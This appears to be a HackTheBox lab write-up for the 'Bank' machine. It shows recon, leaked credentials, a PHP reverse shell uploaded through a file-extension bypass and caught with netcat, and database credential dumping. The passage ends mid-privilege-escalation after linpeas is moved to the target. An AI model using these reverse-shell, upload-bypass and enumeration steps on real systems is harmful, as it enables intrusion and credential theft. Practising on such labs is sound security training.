---
layout: page
title: Bank
description: Abused PHP file upload functionality.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/logo.png" title="HackTheBox Bank" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Bank">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to attempt another HTB box.  Banking on finding something good!  

First things first, run nmap to get a list of services running on the machine.

{% capture nmap %}
└──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.29
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-29 06:58 CST
Nmap scan report for 10.10.10.29
Host is up (0.0012s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=22%CT=1%CU=34052%PV=Y%DS=2%DC=T%G=Y%TM=695
OS:27B04%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8
OS:)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M55
OS:2ST11NW7%O6=M552ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT     ADDRESS
1   1.13 ms 10.10.14.1
2   1.41 ms 10.10.10.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.31 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Since it is running port 53, update the /etc/hosts with bank.htb.

{% capture etchosts %}
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot
10.10.10.29 bank.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-vpqhjafsoe htb-vpqhjafsoe.htb-cloud.com
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etchosts %}

<br />
Run curl with the i option to pull the headers to try and fingerprint the technology.

{% capture curli %}
└──╼ [★]$ curl -I http://bank.htb
HTTP/1.1 302 Found
Date: Mon, 29 Dec 2025 13:05:10 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Set-Cookie: HTBBankAuth=2lvrrdnq1h375hkp8n8d2qgif7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: login.php
Content-Type: text/html
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli %}

<br />
Check the landing page that is running on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/landingpage.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the landing page.

{% capture landingpagesourcecode %}
<!DOCTYPE html>
<html>
  <head>
    <title>HTB Bank - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Bootstrap -->
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <!-- styles -->
    <link href="./assets/css/theme/styles.css" rel="stylesheet">
  </head>
  <body class="login-bg">
    <div class="header">
       <div class="container">
          <div class="row">
             <div class="col-md-12">
                <!-- Logo -->
                <div class="logo">
                   <h1><a href="index.html">HTB Bank</a></h1>
                </div>
             </div>
          </div>
       </div>
  </div>

  <div class="page-content container">
    <div class="row">
      <div class="col-md-4 col-md-offset-4">
        <div class="login-wrapper">
              <div class="box">
                  <div class="content-wrap">
                      <h6>Login</h6>
                                            <form method="post" action>
                        <input class="form-control" type="text" name="inputEmail" placeholder="E-mail address" required>
                        <input class="form-control" type="password" name="inputPassword" placeholder="Password" required>
                        <div class="action">
                            <input class="btn btn-primary signup" type="submit" name="submit" />
                        </div>
                      </form>                
                  </div>
              </div>
          </div>
      </div>
    </div>
  </div>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://code.jquery.com/jquery.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="./assets/js/js/bootstrap.min.js"></script>
    <script src="./assets/js/theme/custom.js"></script>
  </body>
</html>
{% endcapture %}
{% include terminal.html language='browser' title='source-code:http://bank.htb/' content=landingpagesourcecode %}

<br />
Check the robots.txt to see if there is anything interesting.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/robots.png" title="Robots.txt" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test the login to test the functionality and see what happens.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/logintest.png" title="Login Test" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run ffuf to try and brute-force directories to see if we can see anything interesting.

{% capture ffuf %}
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://bank.htb/FUZZ -e .php,.bak,.txt -fw 3793

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bank.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Extensions       : .php .bak .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3793
________________________________________________

.php                    [Status: 403, Size: 279, Words: 21, Lines: 11, Duration: 1ms]
login.php               [Status: 200, Size: 1974, Words: 595, Lines: 52, Duration: 0ms]
support.php             [Status: 302, Size: 3291, Words: 784, Lines: 84, Duration: 1ms]
uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 0ms]
assets                  [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 1ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
inc                     [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 279, Words: 21, Lines: 11, Duration: 2ms]
server-status           [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 1ms]
balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 2ms]
:: Progress: [4741016/4741016] :: Job [1/1] :: 4081 req/sec :: Duration: [0:12:28] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffuf %}

<br />
Check the /balance-transfer/ directory.  Check the listing of accounts.  Notice account, `68576f20e9732f1b2edc4df5b8533230`, and notice the size of 257 that is vastly different from the other sizes.

{% capture balancetransfer %}

<snip>

[   ]	31553a37be725d7b5d1add5acae714f2.acc	2017-06-15 09:50	583	 
[   ]	31586fb5ead11d90c96bbdbb463dee21.acc	2017-06-15 09:50	585	 
[   ]	32203b71b000edd1b90258a14bf28a55.acc	2017-06-15 09:50	583	 
[   ]	39095d3e086eb29355d37ed5d19a9ed0.acc	2017-06-15 09:50	583	 
[   ]	42261debb6bdfc4d709d424616bc18cc.acc	2017-06-15 09:50	583	 
[   ]	44987d36fe627d12501b25116c242318.acc	2017-06-15 09:50	584	 
[   ]	45028a24c0a30864f94db632bca0a351.acc	2017-06-15 09:50	585	 
[   ]	47171c38422e049e50532e6606fa932d.acc	2017-06-15 09:50	584	 
[   ]	49206d1e18aa8eb1c64dae4741639b2f.acc	2017-06-15 09:50	585	 
[   ]	50276beac1f014b64b19dbd0e7c6bb1a.acc	2017-06-15 09:50	584	 
[   ]	54656a84fec49d5da07f25ee36b298bd.acc	2017-06-15 09:50	584	 
[   ]	56215edb6917e27802904037da00a977.acc	2017-06-15 09:50	584	 
[   ]	59829e0910101366d704a85f11cfdd15.acc	2017-06-15 09:50	584	 
[   ]	66284d79b5caa9e6a3dd440607b3fdd7.acc	2017-06-15 09:50	584	 
[   ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50	257	 
[   ]	75942bd27ec22afd9bdc8826cc454c75.acc	2017-06-15 09:50	584	 
[   ]	76123b5b589514bc2cb1c6adfb937d13.acc	2017-06-15 09:50	584	 
[   ]	80416d8aaea6d6cf3dcec95780fda17d.acc	2017-06-15 09:50	585	 
[   ]	85006f1266226e84efb919908d5f8333.acc	2017-06-15 09:50	583	 
[   ]	87831b753b8530fddc74e73ca8515a50.acc	2017-06-15 09:50	585	 
[   ]	91249b887c7bf3f6cb7becc0c0ab8ddd.acc	2017-06-15 09:50	584	 
[   ]	94290d34dec7593ce7c5632150a063d2.acc	2017-06-15 09:50	585	 
[   ]	301120b456a3b5981f5cdc9d484f1b3b.acc	2017-06-15 09:50	585	 
[   ]	430547d637347d0da78509b774bb9fdf.acc	2017-06-15 09:50	584	 
[   ]	453500e8ebb7e50f098068d998db0090.acc	2017-06-15 09:50	583	 
[   ]	632416bbd8eb4a3480297ea3875ea568.acc	2017-06-15 09:50	584	 
[   ]	640087eae263bd45eb444767ead7dd65.acc	2017-06-15 09:50	585	 
[   ]	756431ad587f462168df5064b3b829a8.acc	2017-06-15 09:50	584

<snip>

{% endcapture %}
{% include terminal.html language='browser' title='http://bank.htb/balancetransfer/' content=balancetransfer %}

<br />
Check that account and notice the login details from a failed encryption.

{% capture accdetail %}
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
{% endcapture %}
{% include terminal.html language='browser' title='http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc' content=accdetail %}

<br />
Attempt to authenticate ssh with the credentials hoping for a quick win.

{% capture sshattempt %}
└──╼ [★]$ ssh chris@10.10.10.29
The authenticity of host '10.10.10.29 (10.10.10.29)' can't be established.
ED25519 key fingerprint is SHA256:7S4JgORJLloHIy/gCCkxvRpbrpWXAlMs8QK2jFtpn/w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.29' (ED25519) to the list of known hosts.
chris@10.10.10.29's password: 
Permission denied, please try again.
chris@10.10.10.29's password:
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshattempt %}

<br />
Login to the bank and note the dashboard.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/bankdashboard.png" title="Bank Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the pentestmonkey `php-reverse-shell.php` exploit.

{% capture downloadshell %}
└──╼ [★]$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
--2025-12-29 07:34:17--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                       100%[====================================================================================================>]   5.36K  --.-KB/s    in 0s      

2025-12-29 07:34:17 (67.5 MB/s) - ‘shell.php’ saved [5491/5491]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadshell %}

<br />
Change the IP and port of the exploit file.

{% capture monkeyupdate %}

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.12';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>

{% endcapture %}
{% include terminal.html language='bash' title='bash' content=monkeyupdate %}

<br />
Start a netcat listener.

{% capture monkeyupdate %}
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=monkeyupdate %}

<br />
Click on the support tab.  Try to upload a file and fail miserably.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/uploadfailure.png" title="Upload Failure" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Send the request to Intruder.  Mark the extension with position marker.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/intruder.png" title="Send to Intruder" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look up all the php payloads in PayloadsAllTheThings.

{% capture phpext %}
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
.inc
{% endcapture %}
{% include codebox.html title="extensions.lst" content=phpext %}
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst</a>

<br />
Update the payload in the Intruder interface.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/uploadpayloads.png" title="Upload Payloads" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the results and notice nothing stands out particularly notable.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/intruderoutput.png" title="Intruder Output" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the Support source code.  Notice the .htb comment.

{% capture supportsource %}

<snip>

                <div style="position:relative;">
                		<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
				        <a class='btn btn-primary' href='javascript:;'>
				            Choose File...
				            <input type="file" required style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="fileToUpload" size="40"  onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>
				        </a>
				        &nbsp;
				        <span class='label label-info' id="upload-file-info"></span>
				</div>

<snip>

{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://bank.htb/support' content=supportsource %}

<br />
Change the shell extension to `.htb` per the extension.

{% capture changeextension %}
└──╼ [★]$ mv shell.php shell.htb
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=changeextension %}

<br />
Send the request to Repeater and change the extension to `.htb`.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/repeater.png" title="Send to Repeater" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the results.  Looks like it uploaded correctly and view the link to the file.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bank/uploadprogress.png" title="Upload Progress" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Curl the uploaded file to trigger the payload.

{% capture curlfile %}
└──╼ [★]$ curl http://bank.htb/uploads/shell.htb
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curlfile %}

<br />
Check the listener and catch the shell.

{% capture catchshell %}
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.29] 36700
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 15:56:26 up  1:00,  0 users,  load average: 0.00, 3.95, 16.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bank:/$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchshell %}

<br />
Run `sudo -l` to list all of the commands that the user can run as sudo.

{% capture sudol %}
www-data@bank:/$ sudo -l
sudo -l
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
sudo: 3 incorrect password attempts
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sudol %}

<br />
Run id to view the user details.

{% capture id %}
www-data@bank:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=id %}

<br />
Check `/home` to see what users have a home folder.

{% capture checkhome %}
www-data@bank:/var/www/bank$ ls /home
ls /home
chris
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=checkhome %}

<br />
Check the user.php and snag the database password.

{% capture checkuser %}

<snip>

    function getCreditCards($username){
		$mysql = new mysqli("localhost", "root", "!@#S3cur3P4ssw0rd!@#", "htbbank");
		$username = $mysql->real_escape_string($username);
		$result = $mysql->query("SELECT * FROM creditcards WHERE username = '$username'");
		$final = "";
		while($row = $result->fetch_assoc()){
			$final .= "<tr>";
			$final .= "<td>" . $row['type'] . "</td>";
			$final .= "<td>" . $row['number'] . "</td>";
			$final .= "<td>" . $row['date'] . "</td>";
			$final .= "<td>" . $row['cvv'] . "</td>";
			$final .= "<td>" . $row['balance'] . " $</td>";
			$final .= "</tr>";
		}
		return $final;
	}

<snip>

{% endcapture %}
{% include terminal.html language='php' title='user.php' content=checkuser %}

<br />
Su the chris user with the database password to check for password reuse.

{% capture passwordreuse %}
www-data@bank:/var/www/bank/inc$ su chris
su chris
Password: !@#S3cur3P4ssw0rd!@#

su: Authentication failure
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=passwordreuse %}

<br />
Cat the password file to see if there are any users without a home folder.

{% capture etcpasswd %}
www-data@bank:/var/www/bank/inc$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
chris:x:1000:1000:chris,,,:/home/chris:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:112::/var/cache/bind:/bin/false
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etcpasswd %}

<br />
Test su with teh database password.

{% capture su %}
www-data@bank:/var/www/bank/inc$ su
su
Password: !@#S3cur3P4ssw0rd!@#

su: Authentication failure
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=su %}

<br />
Enumerate the database with the credentials from the user.php file.

{% capture enumdatabase %}
www-data@bank:/var/www/bank/inc$ mysql -u root -p
mysql -u root -p
Enter password: !@#S3cur3P4ssw0rd!@#

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1722
Server version: 5.5.55-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbbank            |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.02 sec)

mysql> use htbbank;
use htbbank;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------+
| Tables_in_htbbank |
+-------------------+
| creditcards       |
| tickets           |
| users             |
+-------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+------------------------+----------------+----------------------------------+---------+
| id | username               | email          | password                         | balance |
+----+------------------------+----------------+----------------------------------+---------+
|  1 | Christos Christopoulos | chris@bank.htb | b27179713f7bffc48b9ffd2cf9467620 | 1.337   |
+----+------------------------+----------------+----------------------------------+---------+
1 row in set (0.00 sec)select
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=enumdatabase %}

<br />
Check the `/opt` folder since HTB has been known to use that.

{% capture checkopt %}
www-data@bank:/opt$ ls
ls
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=checkopt %}

<br />
Get the user.txt flag.

{% capture userflag %}
www-data@bank:/home/chris$ cat user.txt
cat user.txt
<redacted>
www-data@bank:/home/chris$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:95:d9:61 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.29/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:d961/64 scope global dynamic 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:fe95:d961/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Download linpeas to scan for potential privesc vector.

{% capture downloadlinpeas %}
└──╼ [★]$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20251215-2904ebf1/linpeas.sh -O linpeas.sh
--2025-12-29 08:13:44--  https://github.com/peass-ng/PEASS-ng/releases/download/20251215-2904ebf1/linpeas.sh
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/165548191/660ec6e1-007c-439e-948b-8f45f46a80d0?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-12-29T14%3A53%3A28Z&rscd=attachment%3B+filename%3Dlinpeas.sh&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-12-29T13%3A53%3A26Z&ske=2025-12-29T14%3A53%3A28Z&sks=b&skv=2018-11-09&sig=wH8eFzXaUhK24dZEB8xLnF%2F0vMzr5jdT%2BBhvENDEOGM%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2NzAxNzkyNCwibmJmIjoxNzY3MDE3NjI0LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.iJ1Lk0VG8x26tDvl-9IV4yIIBbcqctTOL1wBUzX2yKU&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-12-29 08:13:45--  https://release-assets.githubusercontent.com/github-production-release-asset/165548191/660ec6e1-007c-439e-948b-8f45f46a80d0?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-12-29T14%3A53%3A28Z&rscd=attachment%3B+filename%3Dlinpeas.sh&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-12-29T13%3A53%3A26Z&ske=2025-12-29T14%3A53%3A28Z&sks=b&skv=2018-11-09&sig=wH8eFzXaUhK24dZEB8xLnF%2F0vMzr5jdT%2BBhvENDEOGM%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2NzAxNzkyNCwibmJmIjoxNzY3MDE3NjI0LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.iJ1Lk0VG8x26tDvl-9IV4yIIBbcqctTOL1wBUzX2yKU&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                      100%[====================================================================================================>] 952.58K  1.54MB/s    in 0.6s    

2025-12-29 08:13:46 (1.54 MB/s) - ‘linpeas.sh’ saved [975444/975444]

{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadlinpeas %}

<br />
Start python web server to serve the linpeas.

{% capture pythonserver %}
└──╼ [★]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=pythonserver %}

<br />
Transfer linpeas to the victim machine.

{% capture transferlinpeas %}
www-data@bank:/dev/shm$ wget 10.10.14.12:8000/linpeas.sh -O linpeas.sh
wget 10.10.14.12:8000/linpeas.sh -O linpeas.sh
--2025-12-29 16:17:07--  http://10.10.14.12:8000/linpeas.sh
Connecting to 10.10.14.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [text/x-sh]
Saving to: 'linpeas.sh'

100%[======================================>] 975,444     --.-K/s   in 0.03s   

2025-12-29 16:17:07 (26.6 MB/s) - 'linpeas.sh' saved [975444/975444]

